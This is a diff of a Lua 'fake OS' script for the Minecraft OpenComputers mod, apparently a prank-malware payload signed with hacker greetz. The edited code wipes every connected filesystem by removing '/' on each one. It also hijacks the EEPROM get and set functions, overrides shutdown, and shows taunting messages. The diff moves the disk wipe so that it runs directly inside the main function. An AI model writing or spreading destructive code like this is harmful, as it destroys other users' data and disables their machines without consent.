@@ -6,18 +6,16 @@ local cp = {} for a,b in pairs(component.proxy(cl("computer")())) do cp[a]=b end
 
 local resX,resY = gp.maxResolution()
 
-function fun()
-  -- Erase all filesystems connected!!!! copilot tought the component name was disk, btw copilot helped me with some of the features
-  for k,v in pairs(cl("filesystem")) do
-    local d = component.proxy(v)
-    pcall(d,"remove","/")
-  end
-end
+-- OChammer2 Fake OS.lua
 
 function lol()
-
-  fun()
-
+    
+    -- Erase all filesystems connected!!!! copilot tought the component name was disk, btw copilot helped me with some of the features
+    for k,v in pairs(cl("filesystem")) do
+      local d = component.proxy(v)
+      pcall(d,"remove","/")
+    end
+  
     gp.setBackground(0x000000)
     gp.setForeground(0xFFFFFF)
     gp.setResolution(resX,resY)
@@ -48,6 +46,7 @@ function lol()
         "Broken, classic, shiny. Can't even boot into MineOS.";
         "Replacing the EEPROM is for broke people.";
         "";
+        -- put some greetz or something
         "GREETZ: OCboy3, agentfish, Chouladalls, Kurhox, SirKamilMarko";
     }
 
@@ -81,7 +80,7 @@ component.proxy(cl("eeprom")()).set = function(...) -- component.eeprom.set("tes
 end
 
 component.proxy(cl("eeprom")()).get = function() -- print(component.eeprom.get())
-  return "GREETZ: OCboy3, agentfish, Chouladalls, Kurhox, SirKamilMarko"
+  return "GREETZ: OCboy3, agentfish, Chouladalls, Kurhox, SirKamilMarko \n OCboy3 will smack your OpenComputer's monitor with a baseball bat. (jk)"
 end
 
 computer.shutdown = function(...)
@@ -101,6 +100,7 @@ local smart = {
     "4. No replacing OS.lua";
     " ";
     "If you break these rules, your OpenComputer will be broken forever.";
+    "And I will smack your OpenComputer's monitor with a baseball bat. (jk)";
     " ";
     "Press any key to continue...";
 }
@@ -120,6 +120,13 @@ local function displayTable(table)
     displayMessage(v,i)
   end
 end
+
+gp.setBackground(0x000000)
+gp.setForeground(0xFFFFFF)
+
+local mx, my = gp.getMaxResolution()
+
+gp.fill(1,1,mx,my," ")
 
 -- display some greetz and stuff
 displayTable(smart)
